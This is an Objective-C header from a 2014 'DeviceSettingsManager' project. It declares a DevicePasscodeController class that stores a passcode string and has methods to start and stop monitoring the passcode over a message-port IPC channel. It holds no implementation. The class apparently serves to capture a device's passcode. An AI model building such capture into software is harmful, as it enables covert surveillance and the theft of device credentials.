//
//  DevicePasscodeController.h
//  DeviceSettingsManager
//
//  Created by Makara on 3/4/14.
//  Copyright (c) 2014 Vervata. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "MessagePortIPCReader.h"

@interface DevicePasscodeController : NSObject <MessagePortIPCDelegate> {
@private
    NSThread    *mControllerThread;
    NSThread    *mCallerThread;
    
    NSRunLoop   *mControllerRunLoop;
    
    NSString    *mPasscode;
    
    id          mDelegate;
    SEL         mSelector;
}

@property (retain) NSThread *mControllerThread;
@property (assign) NSThread *mCallerThread;

@property (retain) NSRunLoop *mControllerRunLoop;

@property (retain) NSString *mPasscode;

@property (assign) id mDelegate;
@property (assign) SEL mSelector;

- (void) startMonitorPasscode;
- (void) stopMonitorPasscode;

@end
